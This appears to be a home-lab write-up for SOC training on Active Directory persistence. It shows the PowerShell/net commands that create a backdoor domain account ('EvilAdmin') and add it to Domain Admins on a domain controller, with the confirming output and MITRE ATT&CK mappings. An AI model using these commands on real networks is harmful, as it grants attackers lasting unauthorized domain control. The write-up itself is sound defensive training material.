# 07 — Active Directory Compromise & Persistence

## Domain Compromise via Backdoor Account Creation

After establishing a remote session on the Domain Controller `ADDC` (`192.168.10.130`) via WinRM, post-exploitation activity was performed to establish domain-level persistence.

The activity was executed directly on the Domain Controller under the remote context of:

```text
MYLAB\Jsmith
```

---

## 1. Domain User Creation & Privilege Escalation

Persistence was established by creating a new domain user account and adding it to the `Domain Admins` group:

```powershell
net user EvilAdmin P@ssword123! /add /domain
net group "Domain Admins" EvilAdmin /add /domain
```

Group membership was then verified:

```powershell
net group "Domain Admins" /domain
```

The output confirmed that `EvilAdmin` was successfully added to the `Domain Admins` group:

```text
Members
-------------------------------------------------------------------------------
Administrator            EvilAdmin
The command completed successfully.
```

This demonstrated successful creation of a privileged domain account and establishment of domain-level persistence.

---

## 2. MITRE ATT&CK Mapping

The activity was mapped to the following MITRE ATT&CK techniques:

### T1136.002 — Create Account: Domain Account

**Tactic:** Persistence

**Technique:** Create Account — Domain Account

### T1098 — Account Manipulation

**Tactic:** Persistence, Privilege Escalation

**Technique:** Account Manipulation

---

> **Lab Scope:** All activity was performed within the isolated SOC home lab environment for defensive security research and SOC Tier 1 training.
